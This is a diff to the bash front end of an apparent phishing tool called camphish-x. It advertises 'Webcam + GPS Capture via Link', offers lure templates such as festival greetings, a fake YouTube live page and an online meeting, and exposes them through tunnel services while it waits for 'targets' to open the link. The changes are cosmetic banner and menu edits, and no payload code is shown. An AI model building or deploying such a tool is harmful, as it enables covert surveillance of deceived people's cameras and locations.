@@ -39,18 +39,18 @@ check_windows
 banner() {
     clear
     printf "\n"
-    printf "\e[1;96m╔══════════════════════════════════════════════════════════════╗\e[0m\n"
-    printf "\e[1;96m║\e[1;97m                                                              \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[1;95m    __  __      ____                                      \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[1;95m   \ \/ /_ __ / ___|___  _ __ ___   ___ _ __ ___          \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[1;95m    \  /| '_ \\\\___ \  / _ \| '_ \` _ \ / _ \ '_ \` _ \\         \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[1;95m    /  \| | | |___) | (_) | | | | | |  __/ | | | | |        \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[1;95m   /_/\_\_| |_|____/ \___/|_| |_| |_|\___|_| |_| |_|        \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[1;97m                                                              \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[1;93m  ► Webcam + GPS Capture  |  v3.0                           \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[0;90m  Kali • Termux • Ubuntu • Parrot • macOS                    \e[1;96m║\e[0m\n"
-    printf "\e[1;96m║\e[1;95m  ★ Created by Infinity x White Devels Team                 \e[1;96m║\e[0m\n"
-    printf "\e[1;96m╚══════════════════════════════════════════════════════════════╝\e[0m\n\n"
+    printf "\e[1;91m  +------------------------------------------------------------------------+\e[0m\n"
+    printf "\e[1;91m  |\e[1;31m                                                                        \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[1;31m   \ \  / \ \  /   \e[1;35m  ____   ___  __  __ \e[1;31m                                   \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[1;31m    \ \/   \ \/    \e[1;35m / ___| / _ \|  \/  |\e[1;31m                                   \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[1;31m     \  \   \  \   \e[1;35m| |     | | | | |\/| |\e[1;31m   \e[1;91m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\e[1;31m                      \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[1;31m     /  /   /  /   \e[1;35m| |___  | |_| | |  | |\e[1;31m   \e[0;35m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[1;31m                      \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[1;31m    /_/\_\ /_/\_\   \e[1;35m \____| \___/|_|  |_|\e[1;31m                                   \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[1;31m                                                                        \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[1;95m    [Infinity x White Devels Team]                                        \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[0;90m    Webcam + GPS Capture via Link • v3.0                                 \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  |\e[0;90m    https://github.com/Adil-fayyaz/camphish-x                            \e[1;91m|\e[0m\n"
+    printf "\e[1;91m  +------------------------------------------------------------------------+\e[0m\n\n"
 }
 dependencies() {
     if ! command -v php > /dev/null 2>&1; then
@@ -61,7 +61,7 @@ dependencies() {
         printf "\e[1;91m  [!] SSH not found. Run: sudo apt install ssh\e[0m\n"
         exit 1
     fi
-    printf "\e[1;92m  ✓ Ready\e[0m\n"
+    printf "\e[1;92m  [✓] Ready\e[0m\n"
 }
 stop() {
     pkill -P $$ > /dev/null 2>&1
@@ -104,10 +104,10 @@ catch_location() {
 }
 checkfound() {
     [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
-    printf "\n\e[1;96m  ═══════════════════════════════════════\e[0m\n"
-    printf "\e[1;92m  ✓ Waiting for targets... Ctrl+C to stop\e[0m\n"
-    printf "\e[1;92m  ✓ GPS + Webcam: ACTIVE\e[0m\n"
-    printf "\e[1;96m  ═══════════════════════════════════════\e[0m\n"
+    printf "\n\e[1;35m  +------------------ STATUS ------------------+\e[0m\n"
+    printf "\e[1;92m  [✓] Waiting for targets... Ctrl+C to stop\e[0m\n"
+    printf "\e[1;92m  [✓] GPS + Webcam: ACTIVE\e[0m\n"
+    printf "\e[1;35m  +---------------------------------------------+\e[0m\n"
     while true; do
         if [[ -e "ip.txt" ]]; then
             printf "\n\e[1;92m  ✓ Target opened link!\e[0m\n"
@@ -275,37 +275,39 @@ payload_template() {
 }
 select_template() {
     while true; do
-        printf "\e[1;97m  [1] Festival Wishing\e[0m\n"
-        printf "\e[1;97m  [2] Live YouTube TV\e[0m\n"
-        printf "\e[1;97m  [3] Online Meeting\e[0m\n"
-        read -p $'\n\e[1;93m  ► Choose template [1]: \e[0m' option_tem
+        printf "\e[1;97m  [01] Festival Wishing\e[0m\n"
+        printf "\e[1;97m  [02] Live YouTube TV\e[0m\n"
+        printf "\e[1;97m  [03] Online Meeting\e[0m\n"
+        printf "\e[1;35m  ------------------------------------------\e[0m\n"
+        read -p $'\n\e[1;91m  [X Cam] Choose template [01]: \e[0m' option_tem
         option_tem="${option_tem:-1}"
         case "$option_tem" in
-            1) read -p $'\e[1;93m  ► Festival name: \e[0m' fest_name;
+            1|01) read -p $'\e[1;93m  [*] Festival name: \e[0m' fest_name;
                fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//');
                [[ -z "$fest_name" ]] && fest_name="Festival"
-               read -p $'\e[1;93m  ► Style: [1]Indian  [2]Islamic [1]: \e[0m' fest_variant
+               read -p $'\e[1;93m  [*] Style: [1]Indian  [2]Islamic [1]: \e[0m' fest_variant
                fest_variant="${fest_variant:-1}"
                break ;;
-            2) read -p $'\e[1;93m  ► YouTube video ID: \e[0m' yt_video_ID;
+            2|02) read -p $'\e[1;93m  [*] YouTube video ID: \e[0m' yt_video_ID;
                [[ -z "$yt_video_ID" ]] && yt_video_ID="dQw4w9WgXcQ"
                break ;;
-            3) break ;;
-            *) printf "\e[1;91m  [!] Invalid. Enter 1, 2 or 3\e[0m\n"; sleep 1 ;;
+            3|03) break ;;
+            *) printf "\e[1;91m  [!] Invalid. Enter 01, 02 or 03\e[0m\n"; sleep 1 ;;
         esac
     done
 }
 choose_tunnel() {
     while true; do
-        printf "\n\e[1;96m  ─────── Step 2/2: Tunnel ───────\e[0m\n"
-        printf "\e[1;97m  [1] Serveo.net \e[0;90m(fast)\e[0m\n"
-        printf "\e[1;97m  [2] localhost.run \e[0;90m(backup)\e[0m\n"
-        read -p $'\n\e[1;93m  ► Choose [1]: \e[0m' option_server
+        printf "\e[1;35m  ---------------- TUNNELS ----------------\e[0m\n"
+        printf "\e[1;97m  [01] Serveo.net \e[0;90m(fast)\e[0m\n"
+        printf "\e[1;97m  [02] localhost.run \e[0;90m(backup)\e[0m\n"
+        printf "\e[1;35m  ------------------------------------------\e[0m\n"
+        read -p $'\n\e[1;91m  [X Cam] Choose tunnel [01]: \e[0m' option_server
         option_server="${option_server:-1}"
         case "$option_server" in
-            1) serveo_tunnel; return ;;
-            2) localhost_run_tunnel; return ;;
-            *) printf "\e[1;91m  [!] Invalid. Enter 1 or 2\e[0m\n"; sleep 1 ;;
+            1|01) serveo_tunnel; return ;;
+            2|02) localhost_run_tunnel; return ;;
+            *) printf "\e[1;91m  [!] Invalid. Enter 01 or 02\e[0m\n"; sleep 1 ;;
         esac
     done
 }
@@ -317,7 +319,7 @@ main_flow() {
         rm -f .monitor_pid
     fi
     rm -f sendlink ip.txt serveo.log localhostrun.log
-    printf "\n\e[1;96m  ─────── Step 1/2: Template ───────\e[0m\n"
+    printf "\e[1;35m  ---------------- TEMPLATES ----------------\e[0m\n"
     select_template
     choose_tunnel
 }
